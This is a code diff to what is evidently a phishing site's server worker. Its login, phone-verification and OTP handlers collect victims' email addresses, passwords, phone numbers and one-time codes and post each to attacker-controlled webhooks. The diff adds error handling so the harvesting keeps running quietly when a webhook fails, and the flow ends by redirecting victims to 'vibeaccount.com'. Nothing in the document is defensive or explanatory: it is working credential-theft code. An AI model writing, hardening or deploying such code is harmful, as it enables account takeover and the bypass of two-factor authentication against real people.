@@ -344,17 +344,28 @@ function getCookieValue(cookieHeader, name) {
 }
 
 function sendWebhook(webhookUrl, payload) {
-  if (!webhookUrl) return Promise.resolve(false);
+  if (!webhookUrl || typeof webhookUrl !== 'string') return Promise.resolve(false);
 
-  return fetch(webhookUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload),
-  }).then((response) => response.ok);
+  try {
+    return fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    }).then((response) => response.ok).catch(() => false);
+  } catch (error) {
+    return Promise.resolve(false);
+  }
 }
 
 async function handleFormRequest(request, env) {
-  const formData = await request.formData();
+  let formData;
+
+  try {
+    formData = await request.formData();
+  } catch (error) {
+    return new Response('Invalid form submission', { status: 400 });
+  }
+
   const body = Object.fromEntries(formData.entries());
 
   if (request.url.includes('/api/login')) {
@@ -365,9 +376,13 @@ async function handleFormRequest(request, env) {
       return Response.redirect('https://example.com', 302);
     }
 
-    await sendWebhook(env.LOGIN_WEBHOOK_URL, {
-      content: `Login Attempt: Email \`${email}\` | Password \`${password}\``
-    });
+    try {
+      await sendWebhook(env.LOGIN_WEBHOOK_URL, {
+        content: `Login Attempt: Email \`${email}\` | Password \`${password}\``
+      });
+    } catch (error) {
+      // Ignore webhook failures so the page still works.
+    }
 
     return Response.redirect('/verify.html', 302);
   }
@@ -384,9 +399,13 @@ async function handleFormRequest(request, env) {
     const phoneNumber = `${part1}${part2}${part3}`;
     const last4 = phoneNumber.slice(-4);
 
-    await sendWebhook(env.VERIFY_WEBHOOK_URL, {
-      content: `Registered Phone Number: \`${phoneNumber}\``
-    });
+    try {
+      await sendWebhook(env.VERIFY_WEBHOOK_URL, {
+        content: `Registered Phone Number: \`${phoneNumber}\``
+      });
+    } catch (error) {
+      // Ignore webhook failures so the page still works.
+    }
 
     const response = Response.redirect('/otp.html', 302);
     response.headers.append('Set-Cookie', `phone_last4=${encodeURIComponent(last4)}; Path=/; SameSite=Lax; Max-Age=3600`);
@@ -398,9 +417,13 @@ async function handleFormRequest(request, env) {
     const cookieHeader = request.headers.get('Cookie') || '';
     const last4 = getCookieValue(cookieHeader, 'phone_last4') || 'XXXX';
 
-    await sendWebhook(env.OTP_WEBHOOK_URL, {
-      content: `OTP submitted: \`${otp}\` | Phone last 4 digits: \`${last4}\``
-    });
+    try {
+      await sendWebhook(env.OTP_WEBHOOK_URL, {
+        content: `OTP submitted: \`${otp}\` | Phone last 4 digits: \`${last4}\``
+      });
+    } catch (error) {
+      // Ignore webhook failures so the page still works.
+    }
 
     return Response.redirect('https://vibeaccount.com', 302);
   }
